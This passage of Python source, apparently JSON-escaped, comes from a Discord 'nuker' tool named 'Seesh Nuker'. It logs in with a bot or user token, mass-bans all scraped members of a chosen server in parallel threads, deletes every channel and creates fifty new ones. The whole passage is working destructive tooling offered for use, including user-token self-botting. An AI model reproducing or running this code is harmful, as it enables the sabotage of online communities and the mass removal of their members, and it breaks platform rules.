\"6\":\n        guildID = int(input(\"\\x1b[38;5;213m> \\033[37mGuild ID\\x1b[38;5;213m: \\033[37m\"))\n        try:    \n            guild = client.get_guild(guildID)\n            await channelids(guildID)\n            await memberids(guildID)\n            await roleids(guildID)\n        except:\n            print(\"\\033[91m>\\033[39m Invalid Guild ID\")\n            await menu()\n\n        print(f'\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Starting Nuke Process')\n        \n        mainMembers = []\n        num = 0\n        with open(\"Scraped/members.txt\", \"r\") as f:\n            ids = f.readlines()\n            for id in ids:\n                mainMembers.append(id)\n\n        members_1 = []\n        members_2 = []\n        members_3 = []\n        total = len(mainMembers)\n        members_per_arrary = round(total/3)\n        \n        for member in mainMembers:\n            if len(members_1) != members_per_arrary:\n                members_1.append(member)\n            else:\n                if len(members_2) != members_per_arrary:\n                    members_2.append(member)\n                else:\n                    if len(members_3) != members_per_arrary:\n                        members_3.append(member)\n                    else:\n                        pass\n        Seesh.Name(guild.id)\n        while True:\n            try:\n                Thread(target=Seesh.Ban, args=(guild.id, members_1[num],)).start()\n                Thread(target=Seesh.Ban, args=(guild.id, members_2[num],)).start()\n                Thread(target=Seesh.Ban, args=(guild.id, members_3[num],)).start()\n                num += 1\n            except IndexError:\n                break\n            except:\n                pass\n        cnum = 0\n        channels = []\n\n        with open(\"Scraped/channels.txt\", \"r\") as f:\n            cids = f.readlines()\n\n            for id in cids:\n                channels.append(id)\n\n        while True:\n            try:\n                Thread(target=Seesh.DelChannel, args=(guild.id, channels[cnum],)).start()\n                cnum += 1\n            except IndexError:\n                break\n            except:\n                pass\n        channel_amount = 50\n        for i in range(channel_amount):\n            Thread(target=Seesh.CreateChannel, args=(guild.id,)).start()\n        await time.sleep(2)\n        await menu()\n    await asyncio.wait([menu()])\n        \n\n\n\ntry:\n    RPC = Presence(client.user.id)\n    RPC.connect() \n\n    RPC.update(details=\"Main Menu\", large_image=\"Seesh\", small_image=\"Seesh\", large_text=\"Seesh Nuker\", start=time.time())\nexcept:\n    pass\n@client.event\nasync def on_ready():\n    if token_type == \"bot\":\n        try:\n            print(f'\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Logged in as {client.user.name}')\n            await menu()\n        except:\n            pass\n@client.event\nasync def on_connect():\n    if token_type == \"user\":\n        try:\n            print(f'\\x1b[38;5;213m[\\033[37m!\\x1b[38;5;213m]\\033[37m Logged in')\n            await menu()\n        except:\n            pass\n@client.event\nasync def on_command_error(ctx, error):\n    if isinstance(error, commands.CommandNotFound):\n        pass\n\ndef Startup():\n    if token_type == \"user\":\n        try:\n            client.run(token, bot=False)\n        except:\n            print(f\"\\n\\033[91m>\\033[39m Invalid Token\")\n            input()\n            os._exit(0)\n\n    elif token_type == \"bot\":\n        try:\n            client.run(token)\n        except:\n            print(f\"\\n\\033[91m>\\033[39m Invalid Token\")\n            print(f\"\\n\\033[91m>\\033[39m Make sure to enable all intents\")\n            input()\n            os._exit(0)\n    else:\n        os._exit(0)\n\nif __name__ == \"__main__\":\n    Startup()\n"
        }
    }
}